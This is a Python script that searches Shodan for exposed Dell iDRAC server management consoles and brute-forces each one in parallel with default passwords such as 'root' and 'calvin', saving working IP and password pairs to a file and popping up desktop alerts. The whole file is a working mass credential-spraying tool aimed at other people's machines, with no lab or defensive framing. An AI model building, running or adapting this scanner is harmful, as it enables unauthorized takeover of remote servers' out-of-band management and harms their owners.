import requests
import threading
import shodan
import json
from windows_toasts import Toast, WindowsToaster
import time
SHODAN_API_KEY = 'key6463653636'
shodan_client = shodan.Shodan(SHODAN_API_KEY)

att = set() 
def railmedaddyngh(ip):
    passwords = ["root", "calvin", "server", "dell", "admin", "password", "test", "hotel", "guest"]
    
    if ip in att: 
        return
    
    att.add(ip)

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-CA',
        'Connection': 'keep-alive',
        'Content-Length': '0',
        'Origin': f'https://{ip}',
        'Referer': f'https://{ip}/restgui/start.html',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'dnt': '1',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-gpc': '1',
        'user': '"root"',
    }

    for password in passwords:
        headers['password'] = f'"{password}"'
        url = f'https://{ip}/sysmgmt/2015/bmc/session'
        
        try:
            response = requests.post(url, headers=headers, verify=False)
            if response.status_code not in [401, 403, 404, 400, 405]:
                auth_result = response.headers.get('authResult')
                if auth_result:
                    print(f"[+] {ip}, password: {password}, authresult: {auth_result}")
                    toaster = WindowsToaster('DellRailer :3')
                    newToast = Toast()
                    newToast.text_fields = [f'Found a working IDRAC! Check the TXT file in your directory. ({ip})']
                    toaster.show_toast(newToast)

                    with open('found_ips.txt', 'a') as f:
                        f.write(f'[+] {ip}, password: {password}, authresult: {auth_result}\n')
                else:
                    print(f'[+] {ip}, password: {password}, authresult: NONE')
                    toaster = WindowsToaster('DellRailer :3')
                    newToast = Toast()
                    newToast.text_fields = [f'Found a working IDRAC! Check the TXT file in your directory.']
                    toaster.show_toast(newToast)
                    with open('found_ips.txt', 'a') as f:
                        f.write(f'[+] {ip}, password: {password}, authresult: NONE\n')
        except requests.RequestException as e:
            pass


def gofetch(query, pages):
    ips = set()
    
    max_retries = 3
    retry_delay = 1
    
    try:
        for page in range(1, pages + 1):
            retries = 0
            while retries < max_retries:
                try:
                    results = shodan_client.search(query, page=page)
                    matches = results.get('matches', [])
                    
                    if not matches:
                        print(f"no results on {page}.")
                        break

                    for result in matches:
                        ip = result['ip_str']
                        ips.add(ip)

                    print(f"{page} - {len(matches)} results found.")
                    break

                except shodan.APIError as e:
                    retries += 1
                    print(f"api err on page {page}, attempt {retries}/{max_retries}: {e}")
                    if retries == max_retries:
                        print(f"max retries.")
                        break
                    time.sleep(retry_delay)
    except Exception as e:
        print(f"Unexpected error: {e}")

    return ips

def worker(ips):
    threads = []
    for ip in ips:
        thread = threading.Thread(target=railmedaddyngh, args=(ip,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def main():
    query = 'Content-Length: 2458 "200 ok" http.component:"AngularJS" http.component:"Bootstrap" http.favicon.hash:1428702434'
    rezult = int(input('how many pages do you want to scan? '))
    print("getting ips...")
    ips = gofetch(query, pages=rezult)
    print(f"{len(ips)} ips found.")
    worker(ips)
    print("Im finished k-king!~")

if __name__ == '__main__':
    main()
